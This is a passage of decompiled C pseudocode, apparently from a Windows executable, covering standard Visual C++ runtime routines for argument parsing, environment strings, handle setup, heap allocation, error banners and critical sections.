                    v54 = v53 + 1;
                    v55 = 1;
                    v56 = *(char *)v54;
                    while (v56 == 92) {
                        // 0x403433
                        v54 = v53 + 1;
                        int32_t v57; // 0x403339
                        v55 = v57 + 1;
                        v56 = *(char *)v54;
                        v57 = v55;
                        v53 = v54;
                        int32_t v58 = v54; // 0x403431
                        int32_t v59 = v55; // 0x403431
                        char v60 = v56; // 0x403431
                    }
                }
                // 0x403437
                v61 = v55;
                int32_t v62 = v54;
                v63 = v51;
                v64 = 1;
                v65 = v62;
                v66 = v61;
                v67 = v49;
                if (v56 != 34) {
                    goto lab_0x403468;
                } else {
                    // 0x40343c
                    v68 = v51;
                    v69 = 1;
                    v70 = v62;
                    v71 = v49;
                    if ((v61 & 1) != 0) {
                        goto lab_0x403466;
                    } else {
                        if (v51 == 0) {
                            // 0x403455
                            v72 = 0;
                            v73 = v62;
                            goto lab_0x403458;
                        } else {
                            int32_t v74 = v62 + 1; // 0x403448
                            v72 = 1;
                            v73 = v74;
                            if (*(char *)v74 != 34) {
                                // 0x403455
                                v72 = 0;
                                v73 = v62;
                                goto lab_0x403458;
                            } else {
                                goto lab_0x403458;
                            }
                        }
                    }
                }
            }
          lab_0x4034cd_2:;
            int32_t v75 = 0; // 0x4034cf
            if (v76 != 0) {
                // 0x4034d1
                *(char *)v76 = 0;
                v75 = v76 + 1;
            }
            // 0x4034d5
            *a5 = *a5 + 1;
            char v77 = *v78; // 0x4033f3
            v31 = v77;
            v32 = v79;
            v33 = v75;
            v34 = v80;
            v35 = v81;
            v36 = v79;
            if (v77 == 0) {
                // break -> 0x4034dc
                break;
            }
        }
    }
    // 0x4034dc
    if (v36 != 0) {
        // 0x4034e0
        *(int32_t *)v36 = 0;
    }
    // 0x4034e3
    *a4 = *a4 + 1;
    return (int32_t)a4;
}

// Address range: 0x4034ed - 0x40361f
int32_t function_4034ed(void) {
    int32_t v1 = g94; // 0x4034ef
    char * lpszEnvironmentBlock; // 0x4034ed
    int16_t * lpWideCharStr; // 0x4034ed
    if (v1 != 0) {
        if (v1 != 1) {
            // 0x4035c5
            if (v1 != 2) {
                // 0x403618
                return 0;
            }
            char * v2 = GetEnvironmentStrings(); // 0x4035ce
            lpszEnvironmentBlock = v2;
            if (v2 == NULL) {
                // 0x403618
                return 0;
            }
            goto lab_0x4035da;
        } else {
            int16_t * v3 = GetEnvironmentStringsW(); // 0x403548
            lpWideCharStr = v3;
            if (v3 == NULL) {
                // 0x403618
                return 0;
            }
            goto lab_0x403554;
        }
    } else {
        int16_t * v4 = GetEnvironmentStringsW(); // 0x403508
        if (v4 == NULL) {
            char * v5 = GetEnvironmentStrings(); // 0x40351c
            if (v5 == NULL) {
                // 0x403618
                return 0;
            }
            // 0x4035ca
            g94 = 2;
            lpszEnvironmentBlock = v5;
            goto lab_0x4035da;
        } else {
            // 0x403544
            g94 = 1;
            lpWideCharStr = v4;
            goto lab_0x403554;
        }
    }
  lab_0x4035da:;
    int32_t v6 = (int32_t)lpszEnvironmentBlock;
    int32_t v7 = v6; // 0x4035de
    int32_t v8 = v6; // 0x4035de
    if (*lpszEnvironmentBlock != 0) {
        while (true) {
            int32_t v9 = v7;
            int32_t v10 = v9 + 1; // 0x4035e0
            int32_t v11 = v10; // 0x4035e3
            if (*(char *)v10 == 0) {
                // 0x4035e5
                v11 = v9 + 2;
                v8 = v11;
                if (*(char *)v11 == 0) {
                    // break -> 0x4035ea
                    break;
                }
            }
            // 0x4035e0
            v7 = v11;
        }
    }
    int32_t v12 = v8 - v6 + 1; // 0x4035ec
    int32_t * v13 = _malloc(v12); // 0x4035f0
    int32_t result = 0; // 0x4035fa
    if (v13 != NULL) {
        int32_t v14 = (int32_t)v13; // 0x4035f0
        function_406210(v14, v6, v12);
        result = v14;
    }
    // 0x40360b
    FreeEnvironmentStringsA(lpszEnvironmentBlock);
    // 0x403618
    return result;
  lab_0x403554:;
    int32_t v15 = (int32_t)lpWideCharStr;
    int32_t v16 = v15; // 0x403559
    int32_t v17 = v15; // 0x403559
    if (*lpWideCharStr != 0) {
        while (true) {
            int32_t v18 = v16;
            int32_t v19 = v18 + 2; // 0x40355c
            int32_t v20 = v19; // 0x403560
            if (*(int16_t *)v19 == 0) {
                // 0x403562
                v20 = v18 + 4;
                v17 = v20;
                if (*(int16_t *)v20 == 0) {
                    // break -> 0x403569
                    break;
                }
            }
            // 0x40355b
            v16 = v20;
        }
    }
    int32_t v21 = 0; // bp-56, 0x40357b
    int32_t v22 = &v21; // 0x40357b
    int32_t cbMultiByte = WideCharToMultiByte(0, 0, lpWideCharStr, (v17 - v15) / 2 + 1, NULL, 0, NULL, NULL); // 0x403580
    int32_t result2 = 0; // 0x403586
    int32_t v23 = v22; // 0x403586
    if (cbMultiByte != 0) {
        int32_t * lpMultiByteStr = _malloc(cbMultiByte); // 0x403589
        result2 = 0;
        v23 = v22;
        if (lpMultiByteStr != NULL) {
            int32_t v24 = 0; // bp-88, 0x4035a1
            int32_t v25 = WideCharToMultiByte(0, 0, lpWideCharStr, 0, (char *)lpMultiByteStr, cbMultiByte, NULL, NULL); // 0x4035a2
            char * v26 = (char *)lpMultiByteStr; // 0x4035a6
            if (v25 == 0) {
                // 0x4035a8
                function_402709((int32_t)lpMultiByteStr);
                v26 = NULL;
            }
            // 0x4035b6
            result2 = (int32_t)v26;
            v23 = &v24;
        }
    }
    // 0x4035ba
    *(int32_t *)(v23 - 4) = v15;
    FreeEnvironmentStringsW((int16_t *)&g167);
    // 0x403618
    return result2;
}

// Address range: 0x40361f - 0x4037db
int32_t function_40361f(int32_t a1) {
    struct _STARTUPINFOA * v1 = (struct _STARTUPINFOA *)1152; // bp-92, 0x403628
    int32_t * v2 = _malloc(1152); // 0x40362d
    if (v2 == NULL) {
        // 0x403639
        v1 = (struct _STARTUPINFOA *)27;
        __amsg_exit();
    }
    int32_t v3 = (int32_t)v2; // 0x40362d
    g153 = v3;
    g155 = false;
    int32_t v4 = v3; // 0x403659
    if (v2 < (int32_t *)-1152) {
        *(char *)(v4 + 4) = 0;
        *(int32_t *)v4 = -1;
        *(int32_t *)(v4 + 8) = 0;
        *(char *)(v4 + 5) = 10;
        v4 += 36;
        while (v4 < g153 + 1152) {
            // 0x40365b
            *(char *)(v4 + 4) = 0;
            *(int32_t *)v4 = -1;
            *(int32_t *)(v4 + 8) = 0;
            *(char *)(v4 + 5) = 10;
            v4 += 36;
        }
    }
    // 0x403679
    int32_t lpStartupInfo; // bp-76, 0x40361f
    v1 = (struct _STARTUPINFOA *)&lpStartupInfo;
    int32_t v5 = (int32_t)&v1; // 0x40367c
    GetStartupInfoA((struct _STARTUPINFOA *)&lpStartupInfo);
    int32_t v6 = v5; // 0x403688
    int32_t v7; // 0x40361f
    int32_t v8; // 0x40361f
    int32_t v9; // 0x40361f
    int32_t v10; // 0x40361f
    uint32_t v11; // 0x40361f
    int32_t v12; // 0x40361f
    int32_t v13; // 0x40361f
    int32_t v14; // 0x40361f
    uint32_t v15; // 0x40361f
    int32_t v16; // 0x40361f
    int32_t v17; // 0x40361f
    int16_t v18; // 0x40361f
    char * v19; // 0x40371d
    if (v17 != 0 && v18 != 0) {
        int32_t v20 = *(int32_t *)v17; // 0x403699
        v15 = v20 < 2048 ? v20 : 2048;
        if (v15 > (int32_t)g155) {
            int32_t v21 = &g154; // 0x40361f
            *(int32_t *)(v5 - 4) = 1152;
            int32_t * v22 = _malloc((int32_t)&g167); // 0x4036c1
            v6 = v5;
            while (v22 != NULL) {
                int32_t v23 = (int32_t)v22; // 0x4036c1
                int32_t * v24 = (int32_t *)v21; // 0x4036d2
                *v24 = v23;
                int32_t v25 = v23; // 0x4036dc
                if (v22 < (int32_t *)-1152) {
                    *(char *)(v25 + 4) = 0;
                    *(int32_t *)v25 = -1;
                    *(int32_t *)(v25 + 8) = 0;
                    *(char *)(v25 + 5) = 10;
                    int32_t v26 = v25 + 36; // 0x4036ef
                    v25 = v26;
                    while (v26 < *v24 + 1152) {
                        // 0x4036de
                        *(char *)(v25 + 4) = 0;
                        *(int32_t *)v25 = -1;
                        *(int32_t *)(v25 + 8) = 0;
                        *(char *)(v25 + 5) = 10;
                        v26 = v25 + 36;
                        v25 = v26;
                    }
                }
                // 0x4036fa
                v21 += 4;
                if (v15 <= (int32_t)g155) {
                    goto lab_0x40370d;
                }
                *(int32_t *)(v5 - 4) = 1152;
                v22 = _malloc((int32_t)&g167);
                v6 = v5;
            }
        } else {
          lab_0x40370d:;
            int32_t v27 = v17 + 4; // 0x40369b
            v16 = v20 + v27;
            v8 = v27;
            v12 = v5;
            v10 = 0;
            v6 = v5;
            if (v15 >= 1) {
                while (true) {
                  lab_0x403713:
                    // 0x403713
                    v11 = v10;
                    int32_t v28 = v12;
                    v9 = v8;
                    int32_t * v29 = (int32_t *)v16; // 0x403716
                    int32_t v30 = *v29; // 0x403716
                    v14 = v28;
                    if (v30 == -1) {
                        goto lab_0x403755;
                    } else {
                        // 0x40371d
                        v19 = (char *)v9;
                        char v31 = *v19; // 0x40371d
                        v14 = v28;
                        if ((v31 & 1) == 0) {
                            goto lab_0x403755;
                        } else {
                            // 0x403723
                            v7 = v30;
                            v13 = v28;
                            if ((v31 & 8) != 0) {
                                goto lab_0x403732;
                            } else {
                                int32_t v32 = v28 - 4; // 0x403727
                                *(int32_t *)v32 = v30;
                                int32_t v33 = GetFileType(&g167); // 0x403728
                                v14 = v32;
                                if (v33 == 0) {
                                    goto lab_0x403755;
                                } else {
                                    // 0x403727
                                    v7 = *v29;
                                    v13 = v32;
                                    goto lab_0x403732;
                                }
                            }
                        }
                    }
                }
            }
        }
    }
  lab_0x40375f:;
    int32_t v34 = 0; // 0x40375f
    int32_t v35 = v6; // 0x40375f
    int32_t v36; // 0x40361f
    int32_t v37; // 0x40361f
    int32_t v38; // 0x40361f
    char * v39; // 0x403775
    while (true) {
      lab_0x403761:;
        int32_t v40 = v35;
        v36 = v34;
        int32_t v41 = g153 + 36 * v36; // 0x40376a
        int32_t * v42 = (int32_t *)v41; // 0x40376a
        if (*v42 != -1) {
            char * v43 = (char *)(v41 + 4); // 0x4037c0
            *v43 = *v43 | -128;
            v38 = v40;
            goto lab_0x4037c4;
        } else {
            // 0x403773
            v39 = (char *)(v41 + 4);
            *v39 = -127;
            int32_t * v44; // 0x40361f
            int32_t v45; // 0x40361f
            int32_t v46; // 0x40361f
            if (v36 != 0) {
                int32_t v47 = v40 - 4; // 0x40378a
                v44 = (int32_t *)v47;
                v45 = v47;
                v46 = (int32_t)(v36 != 1) - 11;
            } else {
                int32_t v48 = v40 - 4;
                int32_t * v49 = (int32_t *)v48;
                *v49 = -10;
                v44 = v49;
                v45 = v48;
                v46 = -10;
            }
            // 0x40378a
            *v44 = v46;
            int32_t * v50 = GetStdHandle((int32_t)&g167); // 0x40378b
            v37 = v45;
            if (v50 == (int32_t *)-1) {
                goto lab_0x4037af;
            } else {
                int32_t v51 = (int32_t)v50; // 0x40378b
                int32_t v52 = v40 - 8; // 0x403798
                *(int32_t *)v52 = v51;
                int32_t v53 = GetFileType(&g167); // 0x403799
                v37 = v52;
                if (v53 == 0) {
                    goto lab_0x4037af;
                } else {
                    int32_t v54 = v53 & 255; // 0x4037a3
                    *v42 = v51;
                    v37 = v52;
                    if (v54 != 2) {
                        // 0x4037b5
                        v38 = v52;
                        if (v54 == 3) {
                            // 0x4037ba
                            *v39 = *v39 | 8;
                            v38 = v52;
                        }
                        goto lab_0x4037c4;
                    } else {
                        goto lab_0x4037af;
                    }
                }
            }
        }
    }
  lab_0x4037ca:;
    // 0x4037ca
    int32_t v55; // 0x40361f
    *(int32_t *)(v55 - 4) = (int32_t)g155;
    return SetHandleCount((int32_t)&g167);
  lab_0x4037c4:
    // 0x4037c4
    v55 = v38;
    int32_t v56 = v36 + 1; // 0x4037c4
    v34 = v56;
    v35 = v55;
    if (v56 == 3) {
        // break -> 0x4037ca
        goto lab_0x4037ca;
    }
    goto lab_0x403761;
  lab_0x4037af:
    // 0x4037af
    *v39 = *v39 | 64;
    v38 = v37;
    goto lab_0x4037c4;
  lab_0x403755:;
    int32_t v57 = v11 + 1; // 0x403759
    v16 += 4;
    v8 = v9 + 1;
    v12 = v14;
    v10 = v57;
    v6 = v14;
    if (v57 >= v15) {
        // break -> 0x40375f
        goto lab_0x40375f;
    }
    goto lab_0x403713;
  lab_0x403732:;
    int32_t v58 = *(int32_t *)(4 * v11 / 32 + (int32_t)&g153); // 0x40373c
    int32_t v59 = v58 + 36 * (v11 & 31); // 0x403746
    *(int32_t *)v59 = v7;
    *(char *)(v59 + 4) = *v19;
    v14 = v13;
    goto lab_0x403755;
}

// Address range: 0x4037db - 0x403817
int32_t function_4037db(int32_t a1) {
    int32_t * v1 = HeapCreate((int32_t)(bool)(a1 == 0), 0x1000, 0); // 0x4037ec
    g152 = (int32_t)v1;
    if (v1 == NULL) {
        // 0x403810
        return 0;
    }
    int32_t result = 1; // 0x403802
    if (function_404005() == 0) {
        // 0x403804
        HeapDestroy((int32_t *)g152);
        result = 0;
    }
    // 0x403810
    return result;
}

// Address range: 0x4038e5 - 0x4038ee
int32_t function_4038e5(void) {
    // 0x4038e5
    int32_t result; // 0x4038e5
    return result;
}

// Address range: 0x403908 - 0x4039cd
int32_t function_403908(int32_t a1, int32_t a2, int32_t a3) {
    // 0x403908
    int32_t v1; // 0x403908
    uint32_t v2; // 0x403908
    int32_t v3; // 0x403908
    *(char *)v1 = (char)(v2 / 256 ^ v1 ^ v3);
    int32_t v4; // 0x403908
    char * v5 = (char *)v4; // bp-4, 0x403910
    int32_t v6 = (int32_t)&v5; // 0x403911
    int32_t v7 = v6; // bp-28, 0x403919
    if ((*(int32_t *)(a1 + 4) & 6) != 0) {
        // 0x4039b0
        __local_unwind2();
        // 0x4039c5
        return 1;
    }
    int32_t v8 = a1; // bp-12, 0x40392e
    int32_t v9 = &v8; // 0x403937
    *(int32_t *)(a2 - 4) = v9;
    int32_t v10 = *(int32_t *)(a2 + 12); // 0x40393d
    if (v10 == -1) {
        // 0x4039c5
        return 1;
    }
    int32_t v11 = &v7;
    int32_t v12 = 12 * v10;
    int32_t v13 = v12; // 0x403950
    int32_t v14 = v9; // 0x403950
    int32_t v15 = a2; // 0x403950
    int32_t v16 = v11; // 0x403950
    int32_t v17 = v6; // 0x403950
    int32_t v18; // 0x403952
    int32_t * v19; // 0x403952
    int32_t * v20; // 0x403953
    int32_t v21; // 0x40395c
    int32_t v22; // 0x40395d
    int32_t v23; // 0x403908
    int32_t v24; // 0x40398d
    if (*(int32_t *)(*(int32_t *)(a2 + 8) + 4 + v12) != 0) {
        // 0x403952
        v18 = v11 - 4;
        v19 = (int32_t *)v18;
        *v19 = v10;
        v20 = (int32_t *)(v11 - 8);
        *v20 = v6;
        v21 = *v19;
        v22 = *(int32_t *)(v6 + 12);
        if (v9 == 0) {
            // 0x403952
            v13 = 12 * v21;
            v14 = 0;
            v15 = v22;
            v16 = v11;
            v17 = v6;
        } else {
            // 0x403964
            if (v9 < 0) {
                // break -> 0x4039c5
                break;
            }
            // 0x403966
            *v19 = v22;
            __global_unwind2();
            *v19 = v21;
            *v20 = v22;
            __local_unwind2();
            *v19 = 1;
            __NLG_Notify();
            v23 = 12 * v21;
            v24 = *(int32_t *)(*(int32_t *)(v22 + 8) + v23);
            *(int32_t *)(v22 + 12) = v24;
            v13 = v23;
            v14 = v24;
            v15 = v22;
            v16 = v18;
            v17 = v22 + 16;
        }
    }
    int32_t v25 = v15;
    int32_t v26 = *(int32_t *)(v25 + 8); // 0x403997
    int32_t v27 = *(int32_t *)(v26 + v13); // 0x40399d
    int32_t result = 1; // 0x403946
    while (v27 != -1) {
        int32_t v28 = v27;
        v11 = v16;
        int32_t v29 = v17;
        int32_t v30 = v14;
        v12 = 12 * v28;
        v13 = v12;
        v14 = v30;
        v15 = v25;
        v16 = v11;
        v17 = v29;
        if (*(int32_t *)(v26 + 4 + v12) != 0) {
            // 0x403952
            v18 = v11 - 4;
            v19 = (int32_t *)v18;
            *v19 = v28;
            v20 = (int32_t *)(v11 - 8);
            *v20 = v29;
            v21 = *v19;
            v22 = *(int32_t *)(v29 + 12);
            if (v30 == 0) {
                // 0x403952
                v13 = 12 * v21;
                v14 = 0;
                v15 = v22;
                v16 = v11;
                v17 = v29;
            } else {
                // 0x403964
                result = 0;
                if (v30 < 0) {
                    // break -> 0x4039c5
                    break;
                }
                // 0x403966
                *v19 = v22;
                __global_unwind2();
                *v19 = v21;
                *v20 = v22;
                __local_unwind2();
                *v19 = 1;
                __NLG_Notify();
                v23 = 12 * v21;
                v24 = *(int32_t *)(*(int32_t *)(v22 + 8) + v23);
                *(int32_t *)(v22 + 12) = v24;
                v13 = v23;
                v14 = v24;
                v15 = v22;
                v16 = v18;
                v17 = v22 + 16;
            }
        }
        // 0x403997
        v25 = v15;
        v26 = *(int32_t *)(v25 + 8);
        v27 = *(int32_t *)(v26 + v13);
        result = 1;
    }
    // 0x4039c5
    return result;
}

// Address range: 0x4039e8 - 0x403a21
int32_t __FF_MSGBANNER(void) {
    // 0x4039e8
    if (g76 == 1) {
        // 0x4039ff
        __NMSG_WRITE(252);
        // 0x403a20
        return __NMSG_WRITE(255);
    }
    // 0x4039f2
    if (g76 != 0 || g13 != 1) {
        // 0x403a20
        return g76;
    }
    // 0x4039ff
    __NMSG_WRITE(252);
    // 0x403a20
    return __NMSG_WRITE(255);
}

// Address range: 0x403a21 - 0x403b74
int32_t __NMSG_WRITE(int32_t a1) {
    int32_t result = &g28; // 0x403a2f
    int32_t v1 = 0; // 0x403a2f
    while (*(int32_t *)result != a1) {
        // 0x403a38
        result += 8;
        v1++;
        if (result >= (int32_t)&g30) {
            // break -> 0x403a43
            break;
        }
    }
    int32_t v2 = 8 * v1; // 0x403a46
    if (*(int32_t *)(v2 + (int32_t)&g28) != a1) {
        // 0x403b71
        return result;
    }
    // 0x403a55
    if (g76 != 1) {
        // 0x403a63
        if (g76 == 0 != (g13 == 1)) {
            // 0x403a74
            if (a1 == 252) {
                // 0x403b71
                return g76;
            }
            // 0x403a80
            int32_t lpFilename; // bp-424, 0x403a21
            int32_t nameSize = GetModuleFileNameA(NULL, (char *)&lpFilename, 260); // 0x403a8e
            int32_t v3 = &lpFilename;
            if (nameSize == 0) {
                // 0x403a98
                function_405d20(v3);
            }
            int32_t v4 = function_403de0(v3); // 0x403ab9
            int32_t v5 = v3; // 0x403ac3
            if (v4 >= 60) {
                // 0x403ac5
                int32_t v6; // bp-483, 0x403a21
                v5 = function_403de0(v3) + (int32_t)&v6;
                function_4065d0(v5, "...", 3);
            }
            // 0x403aee
            int32_t v7; // bp-164, 0x403a21
            function_405d20((int32_t)&v7);
            function_405d30(&v7, v5);
            function_405d30(&v7, (int32_t)"\n\n");
            function_405d30(&v7, *(int32_t *)(v2 + (int32_t)&g29));
            // 0x403b71
            return function_406545(&v7, "Microsoft Visual C++ Runtime Library", 0x12010);
        }
    }
    // 0x403b4b
    function_403de0(*(int32_t *)(v2 + (int32_t)&g29));
    bool result2 = WriteFile(GetStdHandle(-12), &g167, (int32_t)&g167, &g167, (struct _OVERLAPPED *)&g167); // 0x403b6b
    // 0x403b71
    return result2;
}

// Address range: 0x403b74 - 0x403c01
int32_t function_403b74(int32_t a1, int32_t a2) {
    uint32_t v1 = a2 * a1; // 0x403b7b
    int32_t v2 = v1; // 0x403b85
    if (v1 < 0xffffffe1) {
        // 0x403b87
        v2 = v1 != 0 ? v1 + 15 & -16 : 16;
    }
    // 0x403b94
    int32_t v3; // bp-12, 0x403b74
    int32_t v4 = &v3;
    int32_t v5 = v4; // 0x403b99
    int32_t v6 = 0; // 0x403b99
    int32_t * v7; // 0x403b74
    int32_t v8; // 0x403bc3
    int32_t * v9; // 0x403b74
    int32_t v10; // 0x403b74
    int32_t * v11; // 0x403b74
    int32_t result; // 0x403b74
    int32_t * v12; // 0x403bc9
    int32_t * v13; // 0x403b74
    int32_t v14; // 0x403bab
    int32_t v15; // 0x403b74
    int32_t * v16; // 0x403b74
    if (v2 < 0xffffffe1) {
        // 0x403b9b
        v7 = (int32_t *)(v4 - 4);
        if (v1 > g36) {
            // 0x403b9b
            v8 = v4 - 12;
            v11 = (int32_t *)v8;
            v10 = v8;
            v9 = (int32_t *)(v4 - 8);
        } else {
            // 0x403ba3
            *v7 = 9;
            function_403cab((int32_t)&g167);
            v13 = (int32_t *)(v4 - 8);
            *v13 = v1;
            v14 = function_404399((int32_t)&g167);
            v15 = v4 - 12;
            v16 = (int32_t *)v15;
            *v16 = 9;
            function_403d0c((int32_t)&g167);
            v11 = v16;
            v10 = v15;
            v9 = v13;
            if (v14 != 0) {
                // 0x403beb
                *v7 = v1;
                *v13 = 0;
                *v16 = v14;
                function_4066d0((int32_t)&g167, (int32_t)&g167, (int32_t)&g167);
                result = v14;
                return result;
            }
        }
        // 0x403bc0
        *v7 = v2;
        *v9 = 8;
        *v11 = g152;
        v12 = HeapAlloc(&g167, (int32_t)&g167, (int32_t)&g167);
        v6 = (int32_t)v12;
        v5 = v10;
        if (v12 != NULL) {
            // break -> 0x403bf9
            break;
        }
    }
    // 0x403bd5
    result = v6;
    while (g129 != 0) {
        // 0x403bde
        *(int32_t *)(v5 - 4) = v2;
        int32_t v17 = __callnewh((int32_t)&g167); // 0x403bdf
        result = 0;
        if (v17 == 0) {
            // break -> 0x403bf9
            break;
        }
        v4 = v5;
        v5 = v4;
        v6 = 0;
        if (v2 < 0xffffffe1) {
            // 0x403b9b
            v7 = (int32_t *)(v4 - 4);
            if (v1 > g36) {
                // 0x403b9b
                v8 = v4 - 12;
                v11 = (int32_t *)v8;
                v10 = v8;
                v9 = (int32_t *)(v4 - 8);
            } else {
                // 0x403ba3
                *v7 = 9;
                function_403cab((int32_t)&g167);
                v13 = (int32_t *)(v4 - 8);
                *v13 = v1;
                v14 = function_404399((int32_t)&g167);
                v15 = v4 - 12;
                v16 = (int32_t *)v15;
                *v16 = 9;
                function_403d0c((int32_t)&g167);
                v11 = v16;
                v10 = v15;
                v9 = v13;
                if (v14 != 0) {
                    // 0x403beb
                    *v7 = v1;
                    *v13 = 0;
                    *v16 = v14;
                    function_4066d0((int32_t)&g167, (int32_t)&g167, (int32_t)&g167);
                    result = v14;
                    return result;
                }
            }
            // 0x403bc0
            *v7 = v2;
            *v9 = 8;
            *v11 = g152;
            v12 = HeapAlloc(&g167, (int32_t)&g167, (int32_t)&g167);
            v6 = (int32_t)v12;
            v5 = v10;
            result = v6;
            if (v12 != NULL) {
                // break -> 0x403bf9
                break;
            }
        }
        // 0x403bd5
        result = v6;
    }
  lab_0x403bf9:
    // 0x403bf9
    return result;
}

// Address range: 0x403c01 - 0x403c82
int32_t function_403c01(void) {
    // 0x403c01
    function_403cab(2);
    int32_t v1 = 3; // bp-12, 0x403c0d
    if (g162 < 4) {
        // 0x403c75
        int32_t v2; // bp-8, 0x403c01
        *(int32_t *)((int32_t)&v2 - 4) = 2;
        function_403d0c((int32_t)&g167);
        return 0;
    }
    uint32_t v3 = 3;
    int32_t v4 = &v1;
    int32_t v5 = 0;
    int32_t v6 = 4 * v3; // 0x403c20
    int32_t v7 = *(int32_t *)(v6 + g160); // 0x403c23
    int32_t v8 = v5; // 0x403c28
    int32_t v9 = v4; // 0x403c28
    int32_t v10; // 0x403c01
    int32_t v11; // 0x403c01
    int32_t v12; // 0x403c4d
    if (v7 != 0) {
        // 0x403c2a
        v10 = v5;
        if ((*(char *)(v7 + 12) & -125) != 0) {
            // 0x403c30
            *(int32_t *)(v4 - 4) = v7;
            v10 = v5 + (int32_t)(function_40192f((int32_t)&g167) != -1);
        }
        // 0x403c3d
        v11 = v10;
        v8 = v11;
        v9 = v4;
        if (v3 >= 20) {
            // 0x403c42
            v12 = v4 - 4;
            *(int32_t *)v12 = *(int32_t *)(g160 + v6) + 32;
            DeleteCriticalSection((struct _RTL_CRITICAL_SECTION *)&g167);
            *(int32_t *)(v4 - 8) = *(int32_t *)(g160 + v6);
            function_402709((int32_t)&g167);
            *(int32_t *)(g160 + v6) = 0;
            v8 = v11;
            v9 = v12;
        }
    }
    int32_t v13 = v9;
    int32_t result = v8;
    int32_t v14 = v3 + 1; // 0x403c6b
    while (v14 < g162) {
        // 0x403c19
        v3 = v14;
        v4 = v13;
        v5 = result;
        v6 = 4 * v3;
        v7 = *(int32_t *)(v6 + g160);
        v8 = v5;
        v9 = v4;
        if (v7 != 0) {
            // 0x403c2a
            v10 = v5;
            if ((*(char *)(v7 + 12) & -125) != 0) {
                // 0x403c30
                *(int32_t *)(v4 - 4) = v7;
                v10 = v5 + (int32_t)(function_40192f((int32_t)&g167) != -1);
            }
            // 0x403c3d
            v11 = v10;
            v8 = v11;
            v9 = v4;
            if (v3 >= 20) {
                // 0x403c42
                v12 = v4 - 4;
                *(int32_t *)v12 = *(int32_t *)(g160 + v6) + 32;
                DeleteCriticalSection((struct _RTL_CRITICAL_SECTION *)&g167);
                *(int32_t *)(v4 - 8) = *(int32_t *)(g160 + v6);
                function_402709((int32_t)&g167);
                *(int32_t *)(g160 + v6) = 0;
                v8 = v11;
                v9 = v12;
            }
        }
        // 0x403c6b
        v13 = v9;
        result = v8;
        v14 = v3 + 1;
    }
    // 0x403c75
    *(int32_t *)v13 = 2;
    function_403d0c((int32_t)&g167);
    return result;
}

// Address range: 0x403c82 - 0x403cab
int32_t function_403c82(int32_t a1) {
    // 0x403c82
    InitializeCriticalSection((struct _RTL_CRITICAL_SECTION *)g34);
    InitializeCriticalSection((struct _RTL_CRITICAL_SECTION *)g33);
    InitializeCriticalSection((struct _RTL_CRITICAL_SECTION *)g32);
    InitializeCriticalSection((struct _RTL_CRITICAL_SECTION *)g31);
    return &g167;
}

// Address range: 0x403cab - 0x403d0c
int32_t function_403cab(int32_t a1) {
    int32_t * v1 = (int32_t *)(4 * a1 + (int32_t)&g30); // 0x403cb2
    int32_t v2 = *v1; // 0x403cb2
    if (v2 != 0) {
        // 0x403d01
        int32_t v3; // bp-8, 0x403cab
        *(int32_t *)((int32_t)&v3 - 4) = v2;
        EnterCriticalSection((struct _RTL_CRITICAL_SECTION *)&g167);
        return &g167;
    }
    struct _RTL_CRITICAL_SECTION * v4 = (struct _RTL_CRITICAL_SECTION *)24; // bp-16, 0x403cc4
    int32_t * lpCriticalSection = _malloc(24); // 0x403cc6
    if (lpCriticalSection == NULL) {
        // 0x403cd2
        v4 = (struct _RTL_CRITICAL_SECTION *)17;
        __amsg_exit();
    }
    int32_t v5 = (int32_t)lpCriticalSection; // 0x403cc6
    v4 = (struct _RTL_CRITICAL_SECTION *)17;
    function_403cab(17);
    v4 = (struct _RTL_CRITICAL_SECTION *)lpCriticalSection;
    int32_t v6; // 0x403cab
    if (*v1 != 0) {
        // 0x403cf2
        function_402709(v5);
        int32_t v7; // bp-12, 0x403cab
        v6 = &v7;
    } else {
        // 0x403ce8
        InitializeCriticalSection((struct _RTL_CRITICAL_SECTION *)lpCriticalSection);
        *v1 = v5;
        v6 = (int32_t)&v4;
    }
    // 0x403cf8
    *(int32_t *)(v6 - 4) = 17;
    function_403d0c((int32_t)&g167);
    // 0x403d01
    *(int32_t *)v6 = *v1;
    EnterCriticalSection((struct _RTL_CRITICAL_SECTION *)&g167);
    return &g167;
}

// Address range: 0x403d0c - 0x403d21
int32_t function_403d0c(int32_t a1) {
    int32_t lpCriticalSection = *(int32_t *)(4 * a1 + (int32_t)&g30); // 0x403d12
    LeaveCriticalSection((struct _RTL_CRITICAL_SECTION *)lpCriticalSection);
    return &g167;
}

// Address range: 0x403d5f - 0x403dad
int32_t __heap_alloc(uint32_t a1) {
    // 0x403d5f
    if ((uint32_t)g36 >= a1) {
        // 0x403d6d
        function_403cab(9);
        int32_t result = function_404399(a1); // 0x403d75
        function_403d0c(9);
        if (result != 0) {
            // 0x403daa
            return result;
        }
    }
    int32_t dwBytes = a1 != 0 ? a1 + 15 & -16 : 16; // 0x403d98
    // 0x403daa
    return (int32_t)HeapAlloc((int32_t *)g152, 0, dwBytes);
}

// Address range: 0x403dad - 0x403dd6
int32_t function_403dad(uint32_t a1, int32_t a2) {
    // 0x403dad
    if ((int32_t)g155 <= a1) {
        // 0x403db9
        return 0;
    }
    int32_t v1 = *(int32_t *)(4 * a1 / 32 + (int32_t)&g153); // 0x403dc7
    return (int32_t)(*(char *)(36 * (a1 & 31) + 4 + v1) & 64);
}

// Address range: 0x403de0 - 0x403e5b
int32_t function_403de0(int32_t a1) {
    int32_t v1 = a1; // 0x403dea
    if ((a1 & 3) != 0) {
        int32_t v2 = a1;
        int32_t v3 = v2 + 1; // 0x403dee
        while (*(char *)v2 != 0) {
            // 0x403df3
            v1 = v3;
            if ((v3 & 3) == 0) {
                goto lab_0x403e00;
            }
            v2 = v3;
            v3 = v2 + 1;
        }
        // 0x403e33
        return v3 + -1 - a1;
    }
  lab_0x403e00:;
    int32_t v4 = v1; // 0x403de0
    int32_t v5; // 0x403de0
    while (true) {
        // 0x403e00
        v5 = v4;
        uint32_t v6 = *(int32_t *)v5; // 0x403e00
        int32_t v7 = v5 + 4; // 0x403e0e
        if (((v6 ^ -0x7efeff00 ^ v6 + 0x7efefeff) & -0x7efeff00) != 0) {
            if ((char)v6 == 0) {
                // break -> 0x403e51
                break;
            }
            if ((v6 & 0xff00) == 0) {
                // 0x403e47
                return 1 - a1 + v5;
            }
            if ((v6 & 0xff0000) == 0) {
                // 0x403e3d
                return 2 - a1 + v5;
            }
            int32_t v8 = v7; // 0x403e2f
            if (v6 < 0x1000000) {
                // 0x403e33
                return v8 + -1 - a1;
            }
        }
        // 0x403e00
        v4 = v7;
    }
    // 0x403e51
    return v5 - a1;
}

// Address range: 0x403e5b - 0x403eb4
